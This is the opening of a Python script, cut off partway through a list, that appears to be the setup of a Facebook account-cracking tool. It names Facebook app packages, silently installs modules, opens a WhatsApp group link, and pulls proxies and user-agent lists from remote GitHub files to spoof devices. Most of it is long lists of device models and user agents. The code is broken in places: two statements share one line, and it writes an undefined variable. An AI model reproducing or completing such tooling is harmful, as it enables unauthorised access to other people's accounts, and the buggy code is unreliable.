fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:

	import os,requests,json,time,re,random,sys,uuid,string,subprocess	from string import *

	import bs4

	#import dz

	from concurrent.futures import ThreadPoolExecutor as tred

	from bs4 import BeautifulSoup as sop

	from bs4 import BeautifulSoup

except ModuleNotFoundError: 

	print('\n Installing missing modules ...')

	os.system('pip install requests bs4 futures==2 > /dev/null')

	os.system('python trt.py')

	

print('[•] Join Whatsap Group')

os.system('xdg-open https://chat.whatsapp.com/DPSGKJoZTQGDdyfn9v9rK9 ')

try:

	prox= requests.get('https://github.com/HASHIMALEE').text

	open('proxies.txt','w').write(proxies)

except Exception as e:

	print('\x1b[1;95m[√] LOADING...')

	

proxies=open('proxies.txt','r').read().splitlines()

android_models=[]

try:

	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()

	for line in xx:

		android_models.append(line)

except:pass

usr=[]

try:

	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()

	for us in xd:

		usr.append(us)

except: pass

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])

ugen=[]

aqib_ua = random.choice(["Mozilla/5.0 (Linux; Android 13; M2012K11AG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.24 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; M2101K7BI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","AppleCoreMedia/1.0.0.20E252 (iPhone; U; CPU OS 16_4_1 like Mac OS X; de_de)","Mozilla/5.0 (Linux; Android 11; A55) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.51.101","Mozilla/5.0 (Linux; Android 10; CPH1941) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","TuneIn Radio/25.2.1; iPhone13%2C4; iOS/16.3.1","TuneIn Radio/25.2.1; iPhone13%2C1; iOS/16.3.1","Mozilla/5.0 (Linux; Android 11; RMX3511) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Mozilla/5.0 (Linux; 12; SM-A015M) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","TuneIn Radio Pro/25.2.1; iPhone11%2C8; iOS/16.3.1","Mozilla/5.0 (Linux; 13; SM-A536E) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; 13; RMX3472) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 7.1.2; MI PAD Build/NJH47F)","Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 12; SM-M215F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.0.0; VTR-L09 Build/HUAWEIVTR-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; SM-A326W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","TuneIn Radio/25.2.1; iPhone15,2; iOS/16.1.2","Mozilla/5.0 (Linux; Android 9; SM-A750FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; 6156D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; G50 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-G970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; motorola one fusion+ Build/QPIS30.73-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 7.0; SLA-L02) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; T790Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 8.0.0; G8341) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36","TuneIn Radio/25.2.1; iPhone12,8; iOS/16.2","Mozilla/5.0 (Linux; Android 9; SM-A202F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; Nokia 3.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; CPH2065 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-A528B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022113898","Mozilla/5.0 (Linux; Android 11; SM-A307G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 UCURSOS/v1.6_285-android","Mozilla/5.0 (Linux; Android 10; moto g pro Build/QPRS30.80-109-2-10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36 GNews Android/2021042402","Mozilla/5.0 (Linux; Android 12; SM-G975F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 9; vivo 1723 Build/PKQ1.190118.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 12; SM-F721B Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 12; LM-K500 Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A035G Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 GNews Android/2022105540","TuneIn Radio/25.2.0; iPhone12,1; iOS/16.0","Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A Build/HUAWEIWAS-LX1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.1.0; SM-J410G Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/348.0.0.8.103;]","Mozilla/5.0 (Linux; Android 10; M2002J9G Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux; Android 12; RMX2155 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.2.1; iPhone14,5; iOS/16.1","Mozilla/5.0 (Linux; Android 13; SM-G996B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.0.0; BAH2-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-X200 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.149 Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","AppleCoreMedia/1.0.0.20E252 (iPhone; U; CPU OS 16_4_1 like Mac OS X; sv_se)","Mozilla/5.0 (Linux; Android 11; SM-G9750 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 11; SM-A105FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","TuneIn Radio Pro/25.2.1; iPad11,3; iPadOS/16.4","Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]","Mozilla/5.0 (Linux; Android 11; C21 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-G980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 10; MAR-LX3A Build/HUAWEIMAR-L03A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; CPH2179 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-G970F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.2.0; iPad13,2; iPadOS/16.3.1","Mozilla/5.0 (Linux; Android 9; H4113) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; BKL-L09 Build/HUAWEIBKL-L09S) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 12; 22041219NY Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 10; YAL-L21 Build/HUAWEIYAL-L61) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/403.1.0.17.106;]","Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.192 Mobile Safari/537.36 OPR/74.1.3922.71199","Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; vivo 1808 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; CPH2371 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; 5002H_EEA Build/QKQ1.200623.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-X205 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 12; CPH2091) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Lenovo TB-X505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]","Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 12; SM-A515F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 10; SM-A505FN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 13; SM-S908B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.506-21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 GNews Android/2022009684","Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Windows NT 6.1;) Gecko/20100101 Firefox/13.0.1","Mozilla/5.0 (Linux; Android 9; STF-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; Nokia X10 Build/TKQ1.220807.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 LikeWise/99.6.4725.26","Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H307 [FBAN/FBIOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.3;FBSS/2;FBID/phone;FBLC/es_LA;FBOP/5]","Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/349.0.0.8.103;]","Mozilla/5.0 (Linux; Android 10; SM-G960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/349.0.0.8.103;]","Mozilla/5.0 (Linux; Android 8.1.0; SM-T580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 9; SM-G975F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; moto e32(s) Build/STBS32.36-99-1-6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 10; MI MAX 3 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 10; SM-J600FN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.103 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux; Android 12; SM-T505 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 GNews Android/2022120648","Dalvik/2.1.0 (Linux; U; Android 12; Stratus_C7 Build/SP1A.230208.1603)","Mozilla/5.0 (Linux; Android 12; CPH2173 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.41 Mobile Safari/537.36 GNews Android/2022067731","Mozilla/5.0 (Linux; Android 12; CPH2247 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 12; SM-A225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; RMX1911 Build/QKQ1.200209.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/339.0.0.32.118;]","Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","TuneIn 